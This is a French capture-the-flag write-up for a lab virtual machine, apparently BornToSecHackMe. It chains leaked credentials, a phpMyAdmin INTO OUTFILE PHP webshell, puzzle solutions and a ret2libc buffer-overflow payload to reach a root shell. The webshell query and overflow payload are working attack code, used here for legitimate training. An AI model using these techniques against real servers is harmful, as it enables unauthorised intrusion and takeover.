# Write up 1

## Trouver l'ip de la vm

Sur ma machine, les machines virtuelles sont mappées sur le bridge `bridge100`. Nous pouvons donc utiliser `tcpdump` pour sniffer l'arp et trouver l'ip de la vm lors de sa mise en ligne.

```
sudo tcpdump -ni bridge100 -vvv arp
Password:
tcpdump: listening on bridge100, link-type EN10MB (Ethernet), snapshot length 524288 bytes
11:38:45.925940 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.139.3 tell 192.168.139.2, length 28
11:38:45.926217 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.139.3 is-at 5e:e9:1e:0a:54:64, length 28
11:39:17.159248 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.139.3 tell 192.168.139.2, length 28
11:39:17.159272 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.139.3 is-at 5e:e9:1e:0a:54:64, length 28
```

## Reconnaissance

```
nmap -sV -p- 192.168.64.3

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
993/tcp open  ssl/imap Dovecot imapd
```

## Analyse et Exploitation

### Forum

Le scan Nmap révèle un serveur web. En naviguant sur l'application (Forum), nous identifions un post intéressant de l'utilisateur `lmezard` intitulé "Probleme login ?". Ce post contient un extrait de log :

`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`

L'utilisateur semble avoir saisi son mot de passe dans le champ "username".
Nous testons ces identifiants sur le forum et le webmail.

**Credentials:**
- User: `lmezard`
- Password: `!q\]Ej?*5K5cy*AJ`

### Serveur IMAP / Webmail

En nous connectant au Webmail (SquirrelMail) avec ces identifiants, nous accédons aux emails de l'utilisateur.
Dans le dossier `INBOX.Sent`, un email adressé à `ft_root@mail.borntosec.net` contient des identifiants pour la base de données :

**DB Access:**
- User: `root`
- Password: `Fg-'kKXBj87E:aJ$`

### PhpMyAdmin

Nous utilisons ces identifiants pour nous connecter à l'interface PhpMyAdmin (`/phpmyadmin`).
L'accès "root" nous permet d'exécuter des requêtes SQL arbitraires.
Nous pouvons utiliser `INTO OUTFILE` pour écrire un webshell, mais nous devons trouver un dossier inscriptible.
La documentation de "My Little Forum" suggère que `templates_c` est souvent inscriptible.

**Exploit:**
```sql
select "<?php system(\$_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/shell.php"
```

L'exécution de cette requête crée notre webshell.

`http://192.168.64.3/forum/templates_c/shell2.php?cmd=id` -> `uid=33(www-data)`

En explorant le système de fichiers (ou en se basant sur les indices précédents), nous trouvons un nouveau mot de passe pour `lmezard`.

**Credentials:**
- User: `lmezard`
- Password: `G!@M6f4Eatau{sF"`

### FTP

Nous nous connectons au serveur FTP avec ce compte.
Nous y trouvons un fichier `fun`.

Il s'agit d'une archive contenant des centaines de fichiers `pcap` qui sont en réalité des fragments de code C.
Chaque fichier contient un commentaire `//fileXXX` indiquant sa position.
Nous utilisons un script Python pour reconstruire le code source :

```python
# Script de reconstruction (résumé)
files.sort(key=lambda x: int(x.split('file')[1]))
print("".join(content))
```

Une fois compilé et exécuté, le binaire affiche :
`MY PASSWORD IS: Iheartpwnage`
`Now SHA-256 it and submit`

**Credentials:**
- User: `laurie`
- Password: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` (SHA-256 de "Iheartpwnage")

### SSH (Laurie) & Bomb Challenge

Nous nous connectons en SSH avec le compte `laurie`.
Nous trouvons un exécutable `bomb` et un fichier `README`.
Il s'agit d'un challenge de Reverse Engineering classique (CMU Bomb Lab).
Le fichier `README` contient des indices pour les phases 3 et 5.

En analysant le binaire (GDB/Ghidra) ou en reprenant les solutions connues, nous identifions les entrées nécessaires pour désamorcer les 6 phases :

1. `Public speaking is very easy.`
2. `1 2 6 24 120 720` (Factorielles)
3. `1 b 214`
4. `9`
5. `opekmq`
6. `4 2 6 3 1 5`

Le mot de passe pour l'utilisateur suivant (`thor`) est la concaténation de ces réponses.

**Credentials:**
- User: `thor`
- Password: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

### Turtle Challenge

Connecté en tant que `thor`, nous trouvons un fichier `turtle` et un `README`.
Le fichier `turtle` contient des instructions graphiques (Turtle Graphics).
En exécutant ou en simulant ces instructions, le tracé forme le mot "SLASH".
Le sujet indique : "Can you digest the message? :)".
Le mot de passe pour `zaz` est le hash MD5 de "SLASH".

**Credentials:**
- User: `zaz`
- Password: `646da671ca01bb5d84dbb5fb2238dc8e` (MD5 de "SLASH")

### Exploit Me (Root)

Nous nous connectons en SSH avec le compte `zaz`.
Nous trouvons un binaire `exploit_me` avec le bit SUID root activé.
L'analyse montre une vulnérabilité de Buffer Overflow classique (strcpy non sécurisé).
L'ASLR est désactivé sur la machine.

Nous construisons un exploit de type Ret2Libc :
1. Padding pour atteindre EIP (140 bytes)
2. Adresse de `system()` (libc)
3. Adresse de retour (exit ou padding)
4. Adresse de la chaîne `/bin/sh` (libc)

**Exploit Generation:**
```python
# Payload Python
python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x58\xcc\xf8\xb7"'
```

Exécution :
`./exploit_me $(python exploit.py)`

Nous obtenons un shell root !

